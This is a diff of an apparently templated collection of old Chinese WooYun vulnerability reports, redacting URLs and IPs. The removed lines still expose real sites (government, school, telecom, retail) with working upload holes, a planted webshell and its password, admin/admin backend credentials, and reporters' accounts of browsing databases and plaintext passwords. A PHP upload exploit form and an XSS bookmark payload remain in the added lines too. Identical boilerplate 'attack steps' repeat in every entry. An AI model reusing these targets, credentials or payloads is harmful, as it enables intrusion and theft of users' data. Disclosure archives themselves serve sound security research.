-**POC**: 主站地址：http://www.newetone.com/后台地址：http://www.newetone.com:8080/均存在struts漏洞网站首页截图主站有过滤，shell直接废了管理后台未过滤，马儿活着，配置文件截图，大量敏感信息侧漏一个账号导致多个数据库侧漏用户密码直接明文大量订单信息侧漏然后某些卡的信息验证下，成功只进了一个库瞅了几眼，其他的库没进去看，目测数据量不小。裤子什么的没动，厂商尽快修复吧，不然，各种vip。。。。。呵呵。。。。最后弱弱的问一句：咱能不用明文么？？？要不要给发个VIP啥的
+**POC**: 主站地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -19298,9 +19298,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://alliance.pptv.com/include/fckeditor/editor/filemanager/connectors/test.htmlhttp://alliance.pptv.com/include/fckeditor/editor/filemanager/connectors/uploadtest.html没有删除http://alliance.pptv.com/publichttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/tup.jpg/x.php老早的nginx的解析漏洞....我真的不是故意的...仅仅是作为一次测试，没有入侵来着..
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://alliance.pptv.com/include/fckeditor/editor/filemanager/connectors/test.htmlhttp://alliance.pptv.com/include/fckeditor/editor/filemanager/connectors/uploadtest.html没有删除http://alliance.pptv.com/publichttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/tup.jpg/x.php老早的nginx的解析漏洞....写了老半天，突然发现W
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -19320,7 +19320,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 官网：http://www.wecrm.com/成都任我行信息技术有限公司存在问题的系统是：任我行协同CRM、任我行协同OA、任我行协同CRM 精华版客户案例：http://www.wecrm.com/static/consumer/
+**详情**: 官网：https://example.com/[已脱敏] 精华版客户案例：https://example.com/[已脱敏]
 
 **POC**: 漏洞文件：Handlers/OfficeFileDataWrite.ashxif (context.Request["fileName"] != null){text = context.Request["fileName"].ToString();  //可控，文件名}……………………try{HttpPostedFile httpPostedFile2 = context.Request.Files["EDITFILE"];if (httpPostedFile2 != null){int contentLength2 = httpPostedFile2.ContentLength;byte[
 
@@ -19342,9 +19342,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先这个厂商有前人提过的一个漏洞，WooYun: 某通用型政府建站系统由一个越权页面+恶意修改导致网站瞬间出错，文中提到存在越权的页面为http://www.cn-dt.com.cn/cms/template/templateList.jsp其实不止是该页面，通过系统的目录浏览，我们能发现更多的问题以官网为例2#目录浏览（非所有案例都存在，大部分）http://www.cn-dt.com.cn//common/http://www.cn-dt.com.cn/cms/http://www.cn-dt.com.cn/extfile/http://www.cn-dt.com.cn/conf/http://www.cn-dt.com.cn/stat/3#大量管理页面未授权访问也就是说只要你猜得到目录名，目录底下的所有文件你都可以尝试是否存在越权访问我举几个明显的例子（非所有案例都存在，大部分）ht
+**详情**: 首先这个厂商有前人提过的一个漏洞，WooYun: 某通用型政府建站系统由一个越权页面+恶意修改导致网站瞬间出错，文中提到存在越权的页面为https://example.com/[已脱敏]
 
-**POC**: http://dfz.yinchuan.gov.cn:80/extfile/20150328/2015032812163733.jsphttp://gxj.yinchuan.gov.cn:80/extfile/20150328/2015032812105733.jsphttp://www.nxzb.com.cn:80/extfile/20150327/2015032710501333.jsphttp://www.nxgczl.com.cn/common/sweditor/uploadfile/2015032710452933.jsphttp://www.nxnc.gov.cn:80/commo
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -19408,9 +19408,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 通过扫描发现上传页面：http://www.szcdc.cn/admin/fckeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/test.html通过测试对上传文件没有任何限制。
+**详情**: 通过扫描发现上传页面：https://example.com/[已脱敏]
 
-**POC**: 访问：http://www.szcdc.cn/admin/fckeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/test.html直接上传webshell
+**POC**: 访问：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -19440,8 +19440,8 @@
 ---
 
 ---
-### [wooyun-2014-074498] 中国移动某省网管系统后台弱口令（安全意识薄弱）
-**厂商**: https://211.137.251.50:8443/ | **年份**: 2014 | **类型**: 后台弱口令
+### [wooyun-2014-074498] 某运营商某省网管系统后台弱口令（安全意识薄弱）
+**厂商**: https://[IP已脱敏] | **年份**: 2014 | **类型**: 后台弱口令
 
 **元思考**: 触发信号: 功能测试
 
@@ -19452,7 +19452,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: https://211.137.251.50:8443/config/app用户名/密码 admin/admin
+**详情**: https://[IP已脱敏] admin/admin
 
 **POC**: 上图
 
@@ -19498,7 +19498,7 @@
 
 **详情**: inurl:EduPlate\GoodoBlog\
 
-**POC**: http://chxx.edu.sh.cn/EduPlate/GoodoBlog/ftb.insertFile.aspxhttp://syxx.mhedu.sh.cn/EduPlate/GoodoBlog/ftb.insertFile.aspxhttp://www.mhhqyy.com/EduPlate/GoodoBlog/ftb.insertFile.aspxhttp://www.pslq.pudong-edu.sh.cn/goodo/EduPlate/GoodoBlog/ftb.insertFile.aspxhttp://www.hsyr.pudong-edu.sh.cn/EduPlate
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -19540,9 +19540,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 审核的领导你好，我看了你指出的重复漏洞id:109554，我和该漏洞提出的问题是不相同的，我指出的是fck编辑器的问题，上传点和漏洞id:109554的完全不同，并且我提出的是fck任意文件遍历问题，也和其任意文件下载不同。审核的领导辛苦了，求再审核，找到一个漏洞不容易。目标地址：http://219.131.221.59:8080/fck编辑器地址：http://219.131.221.59:8080/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../可跨目录
+**详情**: 审核的领导你好，我看了你指出的重复漏洞id:109554，我和该漏洞提出的问题是不相同的，我指出的是fck编辑器的问题，上传点和漏洞id:109554的完全不同，并且我提出的是fck任意文件遍历问题，也和其任意文件下载不同。审核的领导辛苦了，求再审核，找到一个漏洞不容易。目标地址：http://[IP已脱敏]
 
-**POC**: fck上传地址，可直接上传jsp文件http://219.131.221.59:8080/FCKeditor/editor/filemanager/browser/default/browser.html?Type=&Connector=connectors/jsp/connector可以看到上传的路径都和漏洞id:109554不一样的。我不骗人大马：http://219.131.221.59:8080/UserFiles/File/01test10.jsp密码：520o520
+**POC**: fck上传地址，可直接上传jsp文件http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -19562,7 +19562,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 影响范围：国家数字化学习资源中心1.国家数字化学习资源中心(http://www.nerc.edu.cn/)2.国家数字化学习资源中心-山西中心(http://218.26.168.18/)3.国家数字化学习资源中心-天津中心(http://nerc.tjedu.cn/)4.国家数字化学习资源中心-内蒙古中心(http://202.207.96.8/)5.国家数字化学习资源中心-江苏中心(http://nerc.jstvu.edu.cn/)6.国家数字化学习资源中心-安徽中心(http://218.22.21.231/)我直接用一张图说明了吧！上面截图里面全是用的一套cms！
+**详情**: 影响范围：国家数字化学习资源中心1.国家数字化学习资源中心(https://example.com/[已脱敏])2.国家数字化学习资源中心-山西中心(http://[IP已脱敏]
 
 **POC**: 我们拿福建中心来做演示：1.注册用户2.我的资源库入口3.资源供需-发布供需信息这样就成功拿到webshell了！
 
@@ -19606,7 +19606,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 一个很小很小的漏洞····http://cert.chemao.com.cn/.svn/entries   存在.svn漏洞然后就各种happy  各种嗨了····先不看别的  先看看 config  也就是各种配置吧配置信息真多（以下截图为敏感信息 不上传漏洞肯定不通过  所以抱歉了 为了保护隐私  我帮你打下马赛克吧）邮箱配置：进入企业邮箱：ftp 配置：不太会用 ftp  将就着看吧优酷配置：可惜不是 vip还有些其他信息 就不截图了  我这人懒
+**详情**: 一个很小很小的漏洞····https://example.com/[已脱敏]   存在.svn漏洞然后就各种happy  各种嗨了····先不看别的  先看看 config  也就是各种配置吧配置信息真多（以下截图为敏感信息 不上传漏洞肯定不通过  所以抱歉了 为了保护隐私  我帮你打下马赛克吧）邮箱配置：进入企业邮箱：ftp 配置：不太会用 ftp  将就着看吧优酷配置：可惜不是 vip还有些其他信息 就不截图了  我这人懒
 
 **POC**: (见原文)
 
@@ -19628,9 +19628,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://122.224.218.142:7070/supplier/jsp/index.jsp银泰百货供应商网上对账平台任意用户名字，任意密码返回包，改成true里面有关于i融平台，下载说明的pdf里面有注册步骤说明，跟着填写对应信息，成功注册了一个帐号
+**详情**: http://[IP已脱敏]
 
-**POC**: i融平台地址http://irou.intime.com.cn:8380/supplier/jsp/main.jsp对应功能在基础信息查看时，修改商户id，就是这个修改商户id，造成了可以操作任意商户账户先看看商户的基础信息59000多商户的信息，利用id修改，可越权操作59000多商户的账户供应商月度对账供应商销售对账当日销售对账融资申请处，任意文件上传可以提前结款
+**POC**: i融平台地址https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -19674,7 +19674,7 @@
 
 **详情**: inurl:EduPlate/HomeworkManage
 
-**POC**: http://tywx.mhedu.sh.cn/EduPlate/HomeworkManage/ftb.insertFile.aspxhttp://xsxx.mhedu.sh.cn/EduPlate/HomeworkManage/ftb.insertFile.aspxhttp://i.goodo.com.cn/EduPlate/HomeworkManage/ftb.insertFile.aspxhttp://syxx.mhedu.sh.cn//EduPlate/HomeworkManage/ftb.insertFile.aspx......
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -19694,7 +19694,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.存在问题的站点为联想的大客户官方应用；http://app.lenovo-rel.com/admin/orderadmin1234562.用户信息；3.后台存在上传漏洞；4.权限比较大，致多站点沦陷呀；PS：这得多少用户信息呀，不深入了，求礼物~~
+**详情**: 1.存在问题的站点为联想的大客户官方应用；https://example.com/[已脱敏]
 
 **POC**: 见详细说明
 
@@ -19716,7 +19716,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 一次偶然的机会，发现江西移动官网存在一个编辑器上传漏洞地址是http://www.jx.10086.cn/xxt/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector详细一看，竟然还过滤不严，可上传任意文件和遍目录http://www.jx.10086.cn/xxt/FCKeditor/editor/filemanager/browser/default/browser.html?Connector=http://www.jx.10086.cn/xxt/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector二话不说，果断上传了一个jsp一句话。没想到的在后面，。。。
+**详情**: 一次偶然的机会，发现江西移动官网存在一个编辑器上传漏洞地址是https://example.com/[已脱敏]
 
 **POC**: 由于只做测试就不深入下去了，望官方做好修复工作的同时也渴望乌云能给到一个邀请码，让大家在网络安全的道路上多一个伙伴。
 
@@ -19738,7 +19738,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 网站非本人入侵，本人只做注入测试，图为入侵者挂上的TXT，应该是走后台的一个上传页面拿到权限，但是访问时发现被删除!http://222.247.33.3/upload.jsp 这个也是个上传http://222.247.33.4:8000 而这台服务器 可以目录遍历http://222.247.33.4:8000/bbs/test.jsp 存在爆出绝对路径 还有阿帕奇的应用也爆如果MYSQL存在写入权限入侵者可以轻易拿到服务器权限！http://222.247.33.4:8000/admin/目录下存在存在一个编辑器有安全隐患http://222.247.33.3/manage/ 这个目录存在一个上传html无需后台密码验证可上传入侵者很大可能利用此上传漏洞！http://222.247.33.3/manage/upfile.htm 发现被删除！http://222.247.33.3 公
+**详情**: 网站非本人入侵，本人只做注入测试，图为入侵者挂上的TXT，应该是走后台的一个上传页面拿到权限，但是访问时发现被删除!http://[IP已脱敏] 这个也是个上传http://[IP已脱敏] 而这台服务器 可以目录遍历http://[IP已脱敏] 存在爆出绝对路径 还有阿帕奇的应用也爆如果MYSQL存在写入权限入侵者可以轻易拿到服务器权限！http://[IP已脱敏] 这个目录存在一个上传html无需后台密码验证可上传入侵者很大可能利用此上传漏洞！http://[IP已脱敏] 发现被删除！http://[IP已脱敏] 公
 
 **POC**: (见原文)
 
@@ -19760,7 +19760,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.mil.cn/其实是fck漏洞 我真想不到这居然会有!!!(请别鄙视我)http://www.mil.cn/fckeditor/editor/filemanager/connectors/test.html不多说了
+**详情**: https://example.com/[已脱敏] 我真想不到这居然会有!!!(请别鄙视我)https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -19804,7 +19804,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://61.185.27.29:8080/继续使用以前的exp:<form enctype="multipart/form-data" action="http://oa.dld.com/general/vmeet/wbUpload.php?fileName=test.php+" method="post"><input type="file" name="Filedata" size="50"><br><input type="submit" value="Upload"></form>
+**详情**: http://[IP已脱敏] enctype="multipart/form-data" action="https://example.com/[已脱敏]" method="post"><input type="file" name="Filedata" size="50"><br><input type="submit" value="Upload"></form>
 
 **POC**: (见原文)
 
@@ -19850,7 +19850,7 @@
 
 **详情**: 这套教务系统基于jsp+oracle开发，很多高校都在使用，如大连工业大学，沈阳工业大学，大连外语等，直接google：inurl:ACTIONSHOWNEWS，可以搜索到好多。之前拿下了一个该教务系统的服务器，苦于当时不懂java，一直没能拿到数据库的操作权限，实在是我心头一大遗憾，最近学习了一下java，又捡起了这个，才发现原来这套系统漏洞这么多，注入，任意文件上传就不说了，连数据库连接配置都可任意查看...该教务系统的数据库连接配置文件为:QHDBCONFIG.INI，直接访问教务系统网址+QHDBCONFIG.INI，就可以看到配置了。可以看到，用户名和密码是加密的，因为这个我确实头疼了好一阵，后来靠着java的一些基础，我反编译了jsp调用的包，发现了该密文的加密方式，采用了RSA算法进行加密，不过由于class文件反编译是非常方便的，所以即使采用了这种比较安全的加密算法，也没多
 
-**POC**: 这里我随便搜索了一个，就以济南职业学院（http://edu.jnvc.cn/）做演示吧。首先访问http://edu.jnvc.cn/QHDBCONFIG.INI,可以看到，数据库连接文件已经显示出来了。接着我们解密下数据库的用户名和密码。再接下来，我们根据配置连接数据库就可以了。网络不是很好，程序假死了...不过我们仍可看到，密码都是明文保存的...我们随便登陆一个试试，很好，登陆上了。
+**POC**: 这里我随便搜索了一个，就以济南职业学院（https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -19858,8 +19858,8 @@
 ---
 
 ---
-### [wooyun-2011-01668] QQ书签的一个没危害的代码执行
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2011-01668] 某互联网公司书签的一个没危害的代码执行
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -19872,7 +19872,7 @@
 
 **详情**: 导入功能会执行导入文件中恶意构造的html执行html也是代码执行
 
-**POC**: http://shuqian.qq.com/import.导入a.htma.htm代码<!DOCTYPE NETSCAPE-Bookmark-file-1><DL><p><DT><A HREF="<script>alert(5)</script>" ADD_DATE="1298701242" LAST_VISIT="1300550400" LAST_MODIFIED="1298701246">蚊虫</A></DL><p>即可得导入文件中的 HREF="X" 的X可以换成其他HTML标签 一样执行
+**POC**: https://example.com/[已脱敏] NETSCAPE-Bookmark-file-1><DL><p><DT><A HREF="<script>alert(5)</script>" ADD_DATE="1298701242" LAST_VISIT="1300550400" LAST_MODIFIED="1298701246">蚊虫</A></DL><p>即可得导入文件中的 HREF="X" 的X可以换成其他HTML标签 一样执行
 
 **绕过**: 直接利用
 
